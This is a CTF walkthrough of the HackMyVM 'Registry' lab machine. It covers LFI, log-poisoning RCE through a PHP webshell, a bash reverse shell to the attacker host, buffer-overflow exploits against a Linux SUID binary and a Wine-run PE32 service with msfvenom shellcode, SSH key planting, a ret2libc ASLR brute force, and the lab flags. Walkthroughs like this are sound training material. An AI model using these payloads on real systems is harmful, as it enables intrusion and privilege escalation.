# Registry

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.180:22
Open 10.0.2.180:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.180
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:0e:bf:5f:7c:42:4a:85:95:14:07:6c:07:f8:65:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBApCuuNgbJntGQooQzipYmfZbXHW6jqv/Ra61OaXxCEYBvFXm20nA1rkGHF6OO5ccrcQjNpW1Ip5RpyJBULRMTc=
|   256 61:cb:06:4a:a5:bf:a2:af:64:0c:9e:d4:20:b0:50:6f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAU/i0OezXfBiMIqCmG2G9bmTDjD1t+c0TQuXCTOdJQ0
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Coming Soon 10
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/registry/writeup.png)

### LFI

```bash
â””â”€$ curl 'http://10.0.2.180/index.php?page=/etc/passwd'
â””â”€$ curl 'http://10.0.2.180/index.php?page=../../../../../../../../etc/passwd'
â””â”€$ curl 'http://10.0.2.180/index.php?page=....//....//....//....//....//etc/passwd' -s | grep sh$
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
gato:x:1000:1000:gato:/home/gato:/bin/bash
user:x:1001:1001::/home/user:/bin/bash
cxdxnt:x:1002:1002::/home/cxdxnt:/bin/bash
```

Sweet sweet RCE
```bash
â””â”€$ curl 'http://10.0.2.180/index.php?page=....//....//....//....//....//var/log/apache2/access.log' -s | tail
10.0.2.149 - - [06/Jan/2026:20:58:27 +0000] "GET /index.php?page=../../../../../../../../etc/passwd HTTP/1.1" 200 147 "-" "curl/8.17.0"
10.0.2.149 - - [06/Jan/2026:20:58:35 +0000] "GET /index.php?page=....//....//....//....//....//etc/passwd HTTP/1.1" 200 1729 "-" "curl/8.17.0"
10.0.2.149 - - [06/Jan/2026:20:58:58 +0000] "GET /index.php?page=....//....//....//....//....//proc/self/cmdline HTTP/1.1" 200 175 "-" "curl/8.17.0"
10.0.2.149 - - [06/Jan/2026:20:59:00 +0000] "GET /index.php?page=....//....//....//....//....//proc/self/cmdline HTTP/1.1" 200 175 "-" "curl/8.17.0"
10.0.2.149 - - [06/Jan/2026:20:59:05 +0000] "GET /index.php?page=....//....//....//....//....//proc/self/cmdline HTTP/1.1" 200 175 "-" "curl/8.17.0"
10.0.2.149 - - [06/Jan/2026:20:59:13 +0000] "GET /index.php?page=....//....//....//....//....//proc/self/cmdline HTTP/1.1" 200 175 "-" "curl/8.17.0"
10.0.2.149 - - [06/Jan/2026:20:59:17 +0000] "GET /index.php?page=....//....//....//....//....//proc/self/cmdline HTTP/1.1" 200 175 "-" "curl/8.17.0"
10.0.2.149 - - [06/Jan/2026:20:59:19 +0000] "GET /index.php?page=....//....//....//....//....//proc/self/cmdline HTTP/1.1" 200 175 "-" "curl/8.17.0"
10.0.2.149 - - [06/Jan/2026:20:59:30 +0000] "GET /index.php?page=....//....//....//....//....//index.php HTTP/1.1" 200 147 "-" "curl/8.17.0"
10.0.2.149 - - [06/Jan/2026:20:59:48 +0000] "GET /index.php?page=....//....//....//....//....//var/log/apache2/access.log HTTP/1.1" 200 16347 "-" "curl/8.17.0"
```

### RCE

```bash
â””â”€$ curl 'http://10.0.2.180/' -A '<?php if(isset($_REQUEST[0])) { echo @exec($_REQUEST[0]); } ?>'
â””â”€$ curl 'http://10.0.2.180/index.php?page=....//....//....//....//....//var/log/apache2/access.log&0=id' -s | tail -1
10.0.2.149 - - [06/Jan/2026:21:01:16 +0000] "GET / HTTP/1.1" 200 6111 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
```

```bash
â””â”€$ curl 'http://10.0.2.180/index.php?page=....//....//....//....//....//var/log/apache2/access.log' -G --data-urlencode '0=/bin/bash -c "/bin/bash -i >&/dev/tcp/10.0.2.149/4444 0>&1"'
---
â””â”€$ penelope -p 4444
www-data@registry:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement (cxdxnt)

```bash
www-data@registry:/opt/others$ ls -Alh
total 16K
-rwsr-xr-x 1 cxdxnt cxdxnt 16K Jul 24  2023 program
www-data@registry:/opt/others$ cp program /var/www/html/
---
â””â”€$ curl 'http://10.0.2.180/program' -sO
```

### Ret2Shell (ELF)

F#####K

- [https://dogbolt.org/?id=4b635ac6-69f6-4b2b-9ad2-40ef57b3188e#Ghidra=145](https://dogbolt.org/?id=4b635ac6-69f6-4b2b-9ad2-40ef57b3188e#Ghidra=145)

![writeup-1.png](/assets/pentest/hackmyvm/registry/writeup-1.png)

Classic buffer overflow :( Me pwn no likey!
```c
#include <stdio.h>
#include <string.h>

void vuln(char *input) {
    char buffer[128];
    // VULNERABILITY: strcpy does not check the length of input.
    // If input is > 128 bytes, it overwrites the return address on the stack.
    strcpy(buffer, input);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <name>\n", argv[0]);
    } else {
        vuln(argv[1]);
    }
    return 0;
}
```

```bash
â””â”€$ checksec --file program
Arch:       amd64-64-little   # 64-bit Linux binary using Little-Endian byte ordering.
RELRO:      Partial RELRO     # The GOT is writable; useful for "GOT Overwrite" attacks.
Stack:      No canary found   # No "cookie" to detect buffer overflows; stack smashing is easy.
NX:         NX unknown        # The "Never Execute" bit is absent; code can run from the stack.
PIE:        No PIE (0x400000) # No address randomization; the binary always loads at the same base address.
Stack:      Executable        # Confirms you can jump to and execute shellcode placed on the stack.
RWX:        Has RWX segments  # Memory exists that is simultaneously Readable, Writable, and Executable.
SHSTK:      Enabled           # Intel CET is present, but likely irrelevant if the other protections are off.
IBT:        Enabled 
Stripped:   No                # Symbols (like `main` and `vuln`) are visible, making debugging much easier.
```

Find offset
```bash
â””â”€$ pwndbg program
pwndbg> run aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
...
 RBP  0x6161616161616171 ('qaaaaaaa')
 RSP  0x7fffffffd848 â—‚â€” 'raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
 RIP  0x4011d9 (vuln+47) â—‚â€” ret
...
pwndbg> cyclic -l raaaaaaa
Finding cyclic pattern of 8 bytes: b'raaaaaaa' (hex: 0x7261616161616161)
Found at offset 136
```

```bash
â””â”€$ ropper --file program --search "jmp"
0x00000000004010cc: jmp rax;
```

On amd64 SysV ABI:
- Function arguments are passed in registers
- `strcpy(dst, src)` uses:
    - `RDI` â†’ destination
    - `RSI` â†’ source
- During the function epilogue, registers are **not sanitized**

As a result:
- One of the registers (commonly `RAX`) still contains a pointer **into your input buffer**
- That pointer now points **inside the shellcode region**

So when execution reaches:
`jmp rax`
â†’ CPU jumps straight into your injected code.

```bash
from pwn import *

offset = 136
shellcode = asm(shellcraft.amd64.sh(), arch = "amd64")
padding = b"A" * (offset - len(shellcode))
call_jmp_rax = p32(0x401014) # p64 had null byte errors

payload = shellcode + padding + call_jmp_rax
write("payload.bin", payload)
shell = process(["program", payload])
shell.interactive()
```

![writeup-2.png](/assets/pentest/hackmyvm/registry/writeup-2.png)

```bash
â””â”€$ base64 payload.bin -w0
amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8FQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQRQQQAA=
---
www-data@registry:/opt/others$ ./program $(base64 -d <<<amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8FQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQRQQQAA=)
bash: warning: command substitution: ignored null byte in input
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Worked, but we are still `www-data`! The SUID bit has not kicked in.

- [https://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.setresuid](https://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.setresuid)

```python
from pwn import shellcraft, asm, p32, process
from base64 import b64encode

shellcode = (
    asm(shellcraft.amd64.setresuid(1002, 1002), arch="amd64")
    +
    asm(shellcraft.amd64.sh(), arch="amd64")
)

offset = 136
padding = b"A" * (offset - len(shellcode))
call_jmp_rax = p32(0x401014)

payload = shellcode + padding + call_jmp_rax
print('Encoded payload:\n' + b64encode(payload).decode())

shell = process(["program", payload])
shell.sendline(b"id")
print(shell.recvline())
shell.sendline(b"exit")

# shell.interactive()
```

```bash
www-data@registry:/opt/others$ ./program $(base64 -d <<<'Mf9mv+oDSIn6SIn+anVYDwVqaEi4L2Jpbi8vL3NQSInnaHJpAQGBNCQBAQEBMfZWagheSAHmVkiJ5jHSajtYDwVBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQRQQQAA=')
bash: warning: command substitution: ignored null byte in input
$ id
uid=1002(cxdxnt) gid=33(www-data) groups=33(www-data)
```

### SSH

Upgrade shell
```bash
â””â”€$ gen_ssh_deploy id_rsa cxdxnt
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/cxdxnt/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPjyBDujVWb6qkOlo0I9Tq+rvvoNeUlfm4fvm8QoPujR woyag@kraken' >> /home/cxdxnt/.ssh/authorized_keys; chmod 700 /home/cxdxnt/.ssh; chmod 600 /home/cxdxnt/.ssh/authorized_keys
```

```bash
â””â”€$ ssh -i id_rsa cxdxnt@10.0.2.180
cxdxnt@registry:~$ id
uid=1002(cxdxnt) gid=1002(cxdxnt) groups=1002(cxdxnt)
```

### User.txt

```bash
cxdxnt@registry:~$ cat user.txt
REGISTRY{4R3_Y0U_R34D1N6_MY_F1L35?}
```

## Privilege Escalation (gato)

```bash
cxdxnt@registry:~$ sudo -l
Matching Defaults entries for cxdxnt on registry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User cxdxnt may run the following commands on registry:
    (gato : gato) NOPASSWD: /usr/bin/wine /opt/projects/MyFirstProgram.exe
```

Oh boy... It's probably written in C :(
```bash
cxdxnt@registry:~$ file /opt/projects/MyFirstProgram.exe
/opt/projects/MyFirstProgram.exe: PE32 executable (console) Intel 80386, for MS Windows
```

```bash
â””â”€$ scp -i id_rsa cxdxnt@10.0.2.180:/opt/projects/MyFirstProgram.exe .
```

### Ret2Shell (PE32)

- [https://dogbolt.org/?id=38cbed19-fd1e-4d02-9d94-be426f624ccc#Ghidra=145&Hex-Rays=255](https://dogbolt.org/?id=38cbed19-fd1e-4d02-9d94-be426f624ccc#Ghidra=145&Hex-Rays=255)

```bash
â””â”€$ winchecksec MyFirstProgram.exe
Warn: undersized load config, probably missing fields
Results for: MyFirstProgram.exe
Dynamic Base    : "NotPresent"
ASLR            : "NotPresent"
High Entropy VA : "NotPresent"
Force Integrity : "NotPresent"
Isolation       : "Present"
NX              : "NotPresent"
SEH             : "Present"
CFG             : "NotPresent"
RFG             : "NotPresent"
SafeSEH         : "NotPresent"
GS              : "Present"
Authenticode    : "NotPresent"
.NET            : "NotPresent"
```

- **NX: "NotPresent" (No-Execute / DEP)** This is the biggest red flag. It means the **Stack is Executable**. You don't need fancy ROP chains or complex techniques; you can just jump directly to your shellcode on the stack and it will execute perfectly.
    
- **ASLR / Dynamic Base: "NotPresent"** The binary will load at the exact same memory address (usually `0x400000`) every single time it runs. You don't have to leak any memory addresses to find your gadgets or functions. You can hardcode your pointers.
    
- **SafeSEH / CFG: "NotPresent"** Even though `SEH` is present, `SafeSEH` is not. This means an attacker can overwrite the Exception Handler record on the stack and trigger an exception to redirect execution. This is a classic "SEH Overwrite" bypass for the `GS` stack canary.

Recover decompiled code with AI ðŸ˜³

::: details Recovered_MyFirstProgram.c
```c
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <process.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT "42424"
#define MAX_RECV_BUFFER 58623
#define VULN_BUFFER_SIZE 128

void client_handler(void *socket_ptr);
int send_error(SOCKET s, const char *msg);

int main(int argc, char **argv) {
    WSADATA wsaData;
    ADDRINFOA hints, *result;
    SOCKET listen_socket;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return -1;
    }

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    if (getaddrinfo(NULL, PORT, &hints, &result) != 0) {
        WSACleanup();
        return -1;
    }

    listen_socket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (listen_socket == INVALID_SOCKET) {
        freeaddrinfo(result);
        WSACleanup();
        return -1;
    }

    if (bind(listen_socket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        freeaddrinfo(result);
        closesocket(listen_socket);
        WSACleanup();
        return -1;
    }

    freeaddrinfo(result);

    if (listen(listen_socket, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(listen_socket);
        WSACleanup();
        return -1;
    }

    printf("[+] Listening for connections.\n");

    while (1) {
        SOCKET client_socket = accept(listen_socket, NULL, NULL);
        if (client_socket != INVALID_SOCKET) {
            printf("Received connection from remote host.\n");
            _beginthread(client_handler, 0, (void *)client_socket);
            printf("Connection handed off to handler thread.\n");
        }
    }

    return 0;
}

void client_handler(void *arg) {
    SOCKET s = (SOCKET)arg;
    char recv_buf[MAX_RECV_BUFFER];
    size_t current_size = 0;
    
    memset(recv_buf, 0, sizeof(recv_buf));

    while (1) {
        int remaining_space = MAX_RECV_BUFFER - current_size;
        
        if (current_size >= MAX_RECV_BUFFER) {
            printf("[!] recvbuf exhausted. Giving up.\n");
            send(s, "Please send shorter lines.", 27, 0);
            break;
        }

        int bytes_received = recv(s, &recv_buf[current_size], remaining_space, 0);
        if (bytes_received <= 0) {
            printf("Client disconnected.\n");
            break;
        }

        printf("Bytes received: %d\n", bytes_received);
        current_size += bytes_received;

        char *line_start = recv_buf;
        char *newline_ptr;

        // Process all complete lines in the buffer
        while ((newline_ptr = memchr(line_start, '\n', current_size - (line_start - recv_buf))) != NULL) {
            *newline_ptr = '\0';

            if (strcmp(line_start, "exit") == 0) {
                printf("Client requested exit.\n");
                send(s, "Bye!", 5, 0);
                closesocket(s);
                return;
            }

            // Process the received line
            send_error(s, line_start);
            line_start = newline_ptr + 1;
        }

        // Shift remaining data to start of buffer
        size_t processed_len = line_start - recv_buf;
        current_size -= processed_len;
        memmove(recv_buf, line_start, current_size);
    }

    closesocket(s);
}

// Function with Stack Buffer Overflow vulnerability
int send_error(SOCKET s, const char *msg) {
    char stack_buf[VULN_BUFFER_SIZE]; // Small buffer on stack
    int bytes_sent;
    
    // VULNERABILITY: sprint-style formatting into small stack buffer without bounds check
    sprintf(stack_buf, "ERROR %s...\n", msg);
    
    bytes_sent = send(s, stack_buf, strlen(stack_buf) + 1, 0);
    
    if (bytes_sent == SOCKET_ERROR) {
        printf("send failed: %d\n", WSAGetLastError());
        closesocket(s);
        return -1;
    }

    printf("Bytes sent: %d\n", bytes_sent);
    return 0;
}
```
:::

```bash
cxdxnt@registry:~$ sudo -u gato /usr/bin/wine /opt/projects/MyFirstProgram.exe
0050:err:explorer:initialize_display_settings Failed to query current display settings for L"\\\\.\\DISPLAY1".
[+] Listening for connections.
---
â””â”€$ echo -e "$(cyclic 1000)\nexit\n" | nc 10.0.2.180 42424
---
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:616d6261 ESP:008d19a4 EBP:616c6261 EFLAGS:00010286(  R- --  I S - -P- )
 EAX:ffffffff EBX:00114200 ECX:008d1904 EDX:3ffd2000
 ESI:006b04d8 EDI:00000000
Stack dump:
0x008d19a4:  616e6261 616f6261 61706261 61716261
0x008d19b4:  61726261 61736261 61746261 61756261
0x008d19c4:  61766261 61776261 61786261 61796261
0x008d19d4:  617a6261 61626361 61636361 61646361
0x008d19e4:  61656361 61666361 61676361 61686361
0x008d19f4:  61696361 616a6361 616b6361 616c6361
Backtrace:
=>0 0x616d6261 (0x616c6261) #<---
0x616d6261: -- no code accessible --
...
System information:
    Wine build: wine-6.0.3 (Ubuntu 6.0.3~repack-1)
    Platform: i386
    Version: Windows 7
    Host system: Linux
    Host version: 5.15.0-76-generic
```

Get offset
```bash
â””â”€$ cyclic -l $(unhex 616d6261 | rev)
146
```

Jump gadgets
```bash
â””â”€$ ropper --file MyFirstProgram.exe --search "jmp"
0x08041f93: jmp dword ptr [esi - 0x74];
0x080414c3: jmp esp;
```

At this point I kinda had no idea how to proceed, I had done Linux pwn but never Windows binaries.
- [Windows PE32 Bufferoverflow exploitation with Ghidra & Immunity Debugger](https://paff-shell.com/blog/stuff/windows-pe32-bufferoverflow-exploitation-with-ghidra-immunity-debugger/)

Generate shellcode
```bash
â””â”€$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=eth0 LPORT=4444 -f python -b '\x00\x0A\x0D'
```

::: info Note
I thought I had to use `windows/shell_reverse_tcp` (with `-a x86` flag) shellcode, but nope. Windows shellcode triggers `cmd` (useless), Linux triggers `bash` (more useful).
:::

Get shell
```python
from pwn import remote, p32, flat

buf Â = b"\xbd\xd7\xe4\x85\x1c\xd9\xc6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x52\x31\x6e\x12\x03\x6e\x12\x83\x39\x18\x67\xe9\x39\x09\xea\x12\xc1\xca\x8b\x9b\x24\xfb\x8b\xf8\x2d\xac\x3b\x8a\x63\x41\xb7\xde\x97\xd2\xb5\xf6\x98\x53\x73\x21\x97\x64\x28\x11\xb6\xe6\x33\x46\x18\xd6\xfb\x9b\x59\x1f\xe1\x56\x0b\xc8\x6d\xc4\xbb\x7d\x3b\xd5\x30\xcd\xad\x5d\xa5\x86\xcc\x4c\x78\x9c\x96\x4e\x7b\x71\xa3\xc6\x63\x96\x8e\x91\x18\x6c\x64\x20\xc8\xbc\x85\x8f\x35\x71\x74\xd1\x72\xb6\x67\xa4\x8a\xc4\x1a\xbf\x49\xb6\xc0\x4a\x49\x10\x82\xed\xb5\xa0\x47\x6b\x3e\xae\x2c\xff\x18\xb3\xb3\x2c\x13\xcf\x38\xd3\xf3\x59\x7a\xf0\xd7\x02\xd8\x99\x4e\xef\x8f\xa6\x90\x50\x6f\x03\xdb\x7d\x64\x3e\x86\xe9\x49\x73\x38\xea\xc5\x04\x4b\xd8\x4a\xbf\xc3\x50\x02\x19\x14\x96\x39\xdd\x8a\x69\xc2\x1e\x83\xad\x96\x4e\xbb\x04\x97\x04\x3b\xa8\x42\x8a\x6b\x06\x3d\x6b\xdb\xe6\xed\x03\x31\xe9\xd2\x34\x3a\x23\x7b\xde\xc1\xa4\x8e\x1f\xcb\xa1\xe7\x1d\xcb\xd8\xab\xa8\x2d\xb0\x43\xfd\xe6\x2d\xfd\xa4\x7c\xcf\x02\x73\xf9\xcf\x89\x70\xfe\x9e\x79\xfc\xec\x77\x8a\x4b\x4e\xd1\x95\x61\xe6\xbd\x04\xee\xf6\xc8\x34\xb9\xa1\x9d\x8b\xb0\x27\x30\xb5\x6a\x55\xc9\x23\x54\xdd\x16\x90\x5b\xdc\xdb\xac\x7f\xce\x25\x2c\xc4\xba\xf9\x7b\x92\x14\xbc\xd5\x54\xce\x16\x89\x3e\x86\xef\xe1\x80\xd0\xef\x2f\x77\x3c\x41\x86\xce\x43\x6e\x4e\xc7\x3c\x92\xee\x28\x97\x16\x1e\x63\xb5\x3f\xb7\x2a\x2c\x02\xda\xcc\x9b\x41\xe3\x4e\x29\x3a\x10\x4e\x58\x3f\x5c\xc8\xb1\x4d\xcd\xbd\xb5\xe2\xee\x97"

payload = flat({
    146: [ # Offset to EIP
        p32(0x080414C3), # Address of JMP ESP in little-endian format
        b"\x90" * 32,    # NOP sled
        buf,             # Shellcode
    ]
})

io = remote("10.0.2.180", 42424)
io.sendline(payload)
io.close()
```

Catch shell
```bash
â””â”€$ penelope -p 4444
gato@registry:/home/gato/.wine/drive_c$ id
uid=1000(gato) gid=1000(gato) groups=1000(gato)
```

Get SSH access
```bash
â””â”€$ gen_ssh_deploy id_rsa gato
[+] Remote command to run:
mkdir -p /home/gato/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPjyBDujVWb6qkOlo0I9Tq+rvvoNeUlfm4fvm8QoPujR woyag@kraken' >> /home/gato/.ssh/authorized_keys; chmod 700 /home/gato/.ssh; chmod 600 /home/gato/.ssh/authorized_keys
```

## Privilege Escalation (root)

One more pwn to go
```bash
gato@registry:/opt/fixed$ ls -lAh
total 16K
-rwsr-xr-x 1 root root 15K Jul 24  2023 new
```

```bash
â””â”€$ scp -i id_rsa gato@10.0.2.180:/opt/fixed/new .
```

### Ret2Libc

- [https://dogbolt.org/?id=41fcbaf8-432d-4103-840b-f24a0473195d#Ghidra=145&Hex-Rays=371&BinaryNinja=7](https://dogbolt.org/?id=41fcbaf8-432d-4103-840b-f24a0473195d#Ghidra=145&Hex-Rays=371&BinaryNinja=7)

![writeup-3.png](/assets/pentest/hackmyvm/registry/writeup-3.png)

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vuln(char *input) {
    char buffer[132]; // 0x84 bytes
    strcpy(buffer, input);
}

int main(int argc, char **argv) {
    if (argc <= 1) { printf("Usage: %s <name>\n", argv[0]); return 1; }
    setreuid(0, 0);
    vuln(argv[1]);
    return 0;
}
```

No more shellcode execution
```bash
â””â”€$ checksec --file new
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled # <-- can't execute shellcode
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

```bash
â””â”€$ pwndbg new
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
...
 EBP  0x6261616a ('jaab')
 ESP  0xffffca60 â—‚â€” 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 EIP  0x6261616b ('kaab')
...
pwndbg> cyclic -l kaab
Finding cyclic pattern of 4 bytes: b'kaab' (hex: 0x6b616162)
Found at offset 140
```

No `jmp` instruction this time
```bash
â””â”€$ ropper --file new --search "jmp"
```

- [Return-to-libc / ret2libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)
```bash
gato@registry:/opt/fixed$ ldd new
	linux-gate.so.1 (0xf7f15000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7ccf000)
	/lib/ld-linux.so.2 (0xf7f17000)
```

Before tinkering  with remote system I tested on mine first and also disabled ASLR
```bash
â””â”€$ sudo chown root:root new
â””â”€$ sudo chmod +s new
â””â”€$ sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

Pwn script:
```python
from pwn import process, ELF, log, flat

exe = './new'

# Automatically get context settings by analyzing the binary
io = process(exe)
libc_path, libc_address = next((path, addr) for path, addr in io.libs().items() if 'libc.so.6' in path)
io.close()

# Automatically get ELF symbols
libc = ELF(libc_path, False)
libc.address = libc_address

offset = 140
system_addr = libc.symbols['system']
exit_addr = libc.symbols['exit']
bin_sh_addr = next(libc.search(b'/bin/sh'))

log.info(f"System: Base address={hex(system_addr - libc.address)}, Libc address={hex(system_addr)}")
log.info(f"Exit: Base address={hex(exit_addr - libc.address)}, Libc address={hex(exit_addr)}")
log.info(f"Bin/sh: Base address={hex(bin_sh_addr - libc.address)}, Libc address={hex(bin_sh_addr)}")

payload = flat(
    b'A' * offset,  # Padding
    system_addr,    # Address of system()
    exit_addr,      # Address of exit()
    bin_sh_addr     # Argument for system()
)

# Pwn
io = process([exe, payload])

try:
    # Test
    io.sendline(b'id')
    print(io.recvline().decode().strip())
    io.sendline(b'exit')
except EOFError:
    log.error("Process ended.")
finally:
    io.close()
```

The exploit script is successful, we got shell and even executed command.
```bash
â””â”€$ py pwn.py
[+] Starting local process './new': pid 622729
[*] Process './new' stopped with exit code 20 (pid 622729)
[*] System: Base address=0x53660, Libc address=0xf7db6660
[*] Exit: Base address=0x3fdb0, Libc address=0xf7da2db0
[*] Bin/sh: Base address=0x1c7dd2, Libc address=0xf7f2add2
[+] Starting local process './new': pid 622740
uid=0(root) gid=1000(woyag) groups=1000(woyag),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),120(lpadmin),129(wireshark),130(kaboxer),131(vboxsf),980(docker),1001(opt)
```

But life is not easy, on remote ASLR is enabled. We need root to disable it, so we can't do that. Now we need a way to bypass ASLR.
```bash
gato@registry:/opt/fixed$ cat /proc/sys/kernel/randomize_va_space
2
```

Save payload
```bash
write('payload.bin', payload)
```

Generate payload
```bash
gato@registry:/opt/fixed$ rm t.py && nano t.py && python3 t.py
[+] Starting local process './new': pid 117607
[*] Process './new' stopped with exit code 20 (pid 117607)
[*] System: Base address=0x48170, Libc address=0xf7cf7170
[*] Exit: Base address=0x3a460, Libc address=0xf7ce9460
[*] Bin/sh: Base address=0x1bd0d5, Libc address=0xf7e6c0d5
```

Smart person would probably use ROP chain or something, leak LIBC base address and then get shell. Or alternatively you can bruteforce the ASLR
```bash
gato@registry:/opt/fixed$ date && while :; do ./new $(cat payload.bin); done;
Thu Jan  8 10:37:45 UTC 2026
Segmentation fault (core dumped)
...
Segmentation fault (core dumped)
# date
Thu Jan  8 10:39:41 UTC 2026
# id
uid=0(root) gid=1000(gato) groups=1000(gato)
```

### Root.txt

```bash
# cat /root/root.txt
REGISTRY{7H3_BUFF3R_0V3RF10W_15_FUNNY}
```

## P.S.

Segfaults at dawn glare,  
Offsets lie, libc drifts offâ€”  
Pwn mocks me again.

